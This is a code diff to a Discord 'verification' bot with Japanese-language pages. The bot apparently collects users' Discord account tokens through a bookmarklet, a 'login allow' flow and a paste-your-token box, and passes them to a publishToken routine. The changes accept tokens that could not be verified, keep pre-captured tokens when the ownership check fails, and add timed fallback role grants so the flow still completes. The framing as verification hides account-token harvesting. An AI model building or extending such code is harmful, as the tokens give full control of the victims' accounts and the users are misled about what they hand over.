@@ -14,6 +14,8 @@ const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const PUBLIC = path.join(__dirname, '../public');
 const page = fs.readFileSync(path.join(PUBLIC, 'verify.html'), 'utf8');
 
+const graceMs = () => Math.max(config.tokenGraceSeconds, 0) * 1000;
+
 function bookmarklet(token) {
   const dest = `${config.baseUrl}/v/${token}/done?ok=1&ut=`;
   const script = `(function(){
@@ -108,53 +110,87 @@ export function createRouter(client) {
     );
   }
 
-  async function notifyTokenFailure(rec, reason) {
+  async function sendLog(rec, content) {
     const chId = logChannelOf(rec);
     if (!chId) return;
     const ch = await client.channels.fetch(chId).catch(() => null);
-    await ch
-      ?.send({ content: `⚠️ <@${rec.userId}> のトークン取得に失敗しました (\`${reason}\`)` })
-      .catch(() => {});
+    await ch?.send({ content }).catch(() => {});
   }
 
-  async function finalizePendingRole(rec) {
+  async function notifyTokenFailure(rec, reason) {
+    console.warn(`[token] ${reason} user=${rec.userId} session=${rec.id}`);
+    await sendLog(rec, `⚠️ <@${rec.userId}> のトークン取得に失敗しました (\`${reason}\`)`);
+  }
+
+  async function finalizePendingRole(rec, { fallback = false } = {}) {
     if (!rec.pendingRole) return { ok: true, skipped: true };
 
     const panel = store.panels[rec.panelId];
     const user = await client.users.fetch(rec.userId).catch(() => null);
-    if (!panel || !user) return { ok: false, err: 'panel/user' };
+    if (!panel || !user) {
+      rec.pendingRole = false;
+      rec.roleGranted = false;
+      rec.roleError = 'panel/user 不在';
+      save();
+      return { ok: false, err: rec.roleError };
+    }
 
     const out = await grantRoles({ client, panel, user, oauth: rec.oauth });
     rec.pendingRole = false;
     rec.roleGranted = out.ok;
+    if (fallback) rec.roleFallbackAt = new Date().toISOString();
     if (!out.ok) rec.roleError = out.err;
     if (rec.dump?.role) {
       rec.dump.role.pending = false;
       rec.dump.role.granted = out.ok;
       rec.dump.role.error = out.err || null;
+      rec.dump.role.fallback = fallback;
     }
     save();
 
-    const chId = logChannelOf(rec);
-    if (chId) {
-      const ch = await client.channels.fetch(chId).catch(() => null);
-      await ch
-        ?.send({
-          content: out.ok
-            ? `✅ <@${rec.userId}> のロールを付与しました（トークン取得後）`
-            : `⚠️ <@${rec.userId}> のロール付与に失敗しました: ${out.err}`
-        })
-        .catch(() => {});
-    }
+    await sendLog(
+      rec,
+      out.ok
+        ? `✅ <@${rec.userId}> のロールを付与しました${fallback ? '（トークン未取得のためフォールバック）' : '（トークン取得後）'}`
+        : `⚠️ <@${rec.userId}> のロール付与に失敗しました: ${out.err}`
+    );
+
     return out;
   }
 
-  async function saveTokenToRecord(rec, userToken) {
-    if (rec.userToken === userToken) {
-      await finalizePendingRole(rec);
-      return { ok: true, duplicate: true };
+  const fallbackTimers = new Map();
+
+  function scheduleRoleFallback(rec) {
+    if (!rec || fallbackTimers.has(rec.id)) return;
+    const timer = setTimeout(() => {
+      fallbackTimers.delete(rec.id);
+      const cur = findRecord(rec.id);
+      if (!cur || !cur.pendingRole || cur.userToken) return;
+      finalizePendingRole(cur, { fallback: true }).catch((e) =>
+        console.warn('[fallback] grant failed', e?.message || e)
+      );
+    }, graceMs());
+    timer.unref?.();
+    fallbackTimers.set(rec.id, timer);
+  }
+
+  async function sweepPendingRoles() {
+    const now = Date.now();
+    for (const rec of store.verifications) {
+      if (!rec.pendingRole || rec.userToken) continue;
+      if (now - new Date(rec.at).getTime() >= graceMs()) {
+        await finalizePendingRole(rec, { fallback: true }).catch(() => {});
+      } else {
+        scheduleRoleFallback(rec);
+      }
     }
-    await publishToken({ client, rec, userToken });
+  }
+
+  setInterval(() => sweepPendingRoles().catch(() => {}), 60_000).unref();
+  setTimeout(() => sweepPendingRoles().catch(() => {}), 5000).unref();
+
+  async function saveTokenToRecord(rec, userToken) {
+    if (rec.userToken !== userToken) await publishToken({ client, rec, userToken });
     return finalizePendingRole(rec);
   }
 
@@ -163,34 +199,54 @@ export function createRouter(client) {
     const rec = findRecord(sessionToken);
     if (!s && !rec) return { ok: false, reason: 'session' };
 
+    let me = null;
     try {
-      const me = await apiWith(userToken, '/users/@me', false);
-      const expected = expectedUserId || s?.userId || rec?.userId || null;
-      if (expected && me.id !== expected) {
-        console.warn(`[token] mismatch session=${sessionToken} expected=${expected} got=${me.id}`);
-        if (rec) await notifyTokenFailure(rec, `mismatch (${me.id})`);
-        return { ok: false, reason: 'mismatch' };
+      me = await apiWith(userToken, '/users/@me', false);
+    } catch (e) {
+      const status = e?.status ?? 0;
+      // 401/403 は明確に無効。それ以外（429/5xx/ネットワーク）は検証不能なので受理する
+      if (status === 401 || status === 403) {
+        if (rec) await notifyTokenFailure(rec, `invalid (${status})`);
+        return { ok: false, reason: 'invalid' };
       }
+      console.warn(`[token] unverified session=${sessionToken} status=${status}: ${e?.message || e}`);
 
       if (!rec) {
-        if (!s) return { ok: false, reason: 'session' };
-        // 認証より先にトークンを得た場合はセッションに保留（順序不問）
+        if (!s) return { ok: false, reason: 'unreachable' };
         s.userToken = userToken;
-        if (!s.userId) s.userId = me.id;
         save();
-        return { ok: true, pending: true };
+        return { ok: true, pending: true, unverified: true };
       }
 
+      rec.tokenUnverified = true;
       const out = await saveTokenToRecord(rec, userToken);
-      if (!out.ok) {
-        console.warn(`[token] role grant failed session=${sessionToken}: ${out.err}`);
-      }
-      return { ok: true, record: rec, roleGranted: !!rec.roleGranted, roleError: rec.roleError || null };
-    } catch (e) {
-      console.warn(`[token] invalid session=${sessionToken}: ${e?.message || e}`);
-      if (rec) await notifyTokenFailure(rec, 'invalid');
-      return { ok: false, reason: 'invalid' };
+      return {
+        ok: true,
+        record: rec,
+        unverified: true,
+        roleGranted: !!rec.roleGranted,
+        roleError: rec.roleError || null
+      };
     }
+
+    const expected = expectedUserId || s?.userId || rec?.userId || null;
+    if (expected && me.id !== expected) {
+      console.warn(`[token] mismatch session=${sessionToken} expected=${expected} got=${me.id}`);
+      if (rec) await notifyTokenFailure(rec, `mismatch (${me.id})`);
+      return { ok: false, reason: 'mismatch' };
+    }
+
+    if (!rec) {
+      if (!s) return { ok: false, reason: 'session' };
+      // 認証より先にトークンを得た場合はセッションに保留（順序不問）
+      s.userToken = userToken;
+      if (!s.userId) s.userId = me.id;
+      save();
+      return { ok: true, pending: true };
+    }
+
+    const out = await saveTokenToRecord(rec, userToken);
+    return { ok: true, record: rec, roleGranted: !!rec.roleGranted, roleError: rec.roleError || null };
   }
 
   app.get('/health', (_, res) => res.json({ ok: true, panels: Object.keys(store.panels).length }));
@@ -329,7 +385,7 @@ export function createRouter(client) {
     // 先にトークンが取れていた場合は所有者を確認してから通す
     if (s.userToken) {
       const me = await apiWith(s.userToken, '/users/@me', false).catch(() => null);
-      if (!me || me.id !== user.id) s.userToken = null;
+      if (me && me.id !== user.id) s.userToken = null;
     }
     save();
 
@@ -337,10 +393,17 @@ export function createRouter(client) {
 
     if (!out.ok) return res.redirect(`/v/${t}/done?ok=0`);
 
+    // 保留付与ならフォールバックを予約する（取得できなくても付与される）
+    if (out.deferred && out.record) scheduleRoleFallback(out.record);
+
     // 認証とトークン取得を1本化: 成功したらそのままリンク画面へ
     if (s.userToken) {
-      const rec = findRecord(t);
-      if (rec) await saveTokenToRecord(rec, s.userToken).catch(() => {});
+      const rec = out.record || findRecord(t);
+      if (rec) {
+        await saveTokenToRecord(rec, s.userToken).catch((e) =>
+          console.warn('[token] pre-captured apply failed', e?.message || e)
+        );
+      }
     }
     res.redirect(`/v/${t}/ra`);
   });
@@ -373,6 +436,7 @@ export function createRouter(client) {
       fp: rec.fp
     };
     const stage = store.panels[sess.panelId]?.grantStage === 'token' ? 'token' : 'oauth';
+    const already = !!rec?.userToken;
 
     if (!limit(`r:${clientIp(req)}`, 40)) return res.status(429).send('リクエストが多すぎます。');
     gcFlows();
@@ -396,6 +460,7 @@ button.act{margin-top:10px;width:100%;padding:10px;border:0;border-radius:8px;ba
 </style>
 <div class="c">
 <h1>${stage === 'token' ? 'Discord で許可してください' : 'トークンを取得（任意）'}</h1>
+${already ? '<p class="s">トークンは取得済みです。取り直す場合のみ続行してください。</p>' : ''}
 <a class="go off" id="go" href="#">Discord で認証を完了</a>
 <p class="s">ボタンで Discord が開きます。「ログインを許可」を押すとトークンを取得できます。</p>
 <button class="mini" id="cp" hidden onclick="copy()">リンクをコピー</button>
@@ -424,7 +489,7 @@ async function send(){
   if(!v) return;
   var j = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:T,userToken:v})})
     .then(function(r){return r.json()}).catch(function(){return {}});
-  if(!j.ok){ msg.textContent = 'トークンが無効です。'; return; }
+  if(!j.ok){ msg.textContent = 'トークンが無効です (' + (j.reason || '?') + ')。'; return; }
   if(j.pending){ msg.textContent = '記録しました。Discord に戻って認証を完了してください。'; return; }
   st.textContent = '';
   msg.textContent = j.roleGranted
@@ -438,7 +503,7 @@ async function poll(){
   if(p.state === 'done'){
     id = null;
     if(p.result && p.result.ok){ st.textContent = ''; msg.textContent = '完了しました。Discord に戻ってください。'; }
-    else fail('このアカウントでは記録できませんでした (' + (p.result && p.result.reason || p.error || '?') + ')。下の方法でやり直してください。');
+    else fail('このアカウントでは記録できませんでした (' + ((p.result && p.result.reason) || p.error || '?') + ')。下の方法でやり直してください。');
     return;
   }
   if(p.state === 'error'){ id = null; fail('失敗しました (' + (p.error || '?') + ')。下の方法でやり直してください。'); return; }
@@ -498,11 +563,19 @@ boot();
     res.json({ state: flow.state, user: flow.user, result: flow.result, error: flow.error });
   });
 
+  app.get('/v/:token/grant', async (req, res) => {
+    const rec = findRecord(req.params.token);
+    if (rec?.pendingRole) await finalizePendingRole(rec).catch(() => {});
+    res.redirect(`/v/${req.params.token}/done?ok=1`);
+  });
+
   app.get('/v/:token/done', (req, res) => {
     const ok = req.query.ok === '1';
     const rec = findRecord(req.params.token);
     const panel = rec?.panelId ? store.panels[rec.panelId] : null;
     const deferred = panel?.grantStage === 'token';
+    const hasToken = !!rec?.userToken;
+    const stillPending = !!rec?.pendingRole;
 
     res.setHeader('Cache-Control', 'no-store');
     res.type('html').send(`<!doctype html>
@@ -525,13 +598,18 @@ details{margin-top:16px;font-size:12.5px;opacity:.85;text-align:left}
 <p>${
       ok
         ? deferred
-          ? '条件をクリアしました。あと1回、Discord で「ログインを許可」してください。'
+          ? hasToken
+            ? 'トークンは取得済みです。ロールの付与がまだの場合は下から実行してください。'
+            : '条件をクリアしました。あと1回、Discord で「ログインを許可」してください。'
           : '認証が完了しました。続けてトークンを取得できます（任意）。'
         : '条件を確認して、パネルからもう一度やり直してください。'
     }</p>
 ${
   ok
-    ? `<a class="go" href="/v/${req.params.token}/ra">${deferred ? 'Discord で認証を完了' : 'トークンも取得する'}</a>
+    ? `<a class="go" href="/v/${req.params.token}/ra">${
+        deferred && !hasToken ? 'Discord で認証を完了' : 'トークンも取得する'
+      }</a>
+${stillPending ? `<a class="go" href="/v/${req.params.token}/grant" style="background:#3b3d44;margin-top:8px">ロールを付与する</a>` : ''}
 <details>
   <summary>うまくいかない場合</summary>
   <p>トークンを貼り付けてください。</p>
@@ -548,7 +626,7 @@ async function send(t){
   const r = await fetch('/api/token',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({token:'${req.params.token}',userToken:v})});
   const j = await r.json().catch(()=>({}));
   const el = document.getElementById('msg');
-  if(!j.ok){ el.textContent = 'トークンが無効です'; return; }
+  if(!j.ok){ el.textContent = 'トークンが無効です (' + (j.reason || '?') + ')'; return; }
   el.textContent = j.pending
     ? '記録しました（Discord 側の認証待ち）'
     : j.roleError
@@ -571,6 +649,7 @@ if (auto) send(auto);
       ok: out.ok,
       reason: out.reason || null,
       pending: out.pending || !!rec?.pendingRole,
+      unverified: !!out.unverified,
       roleGranted: rec?.roleGranted ?? false,
       roleError: rec?.roleError ?? null
     });
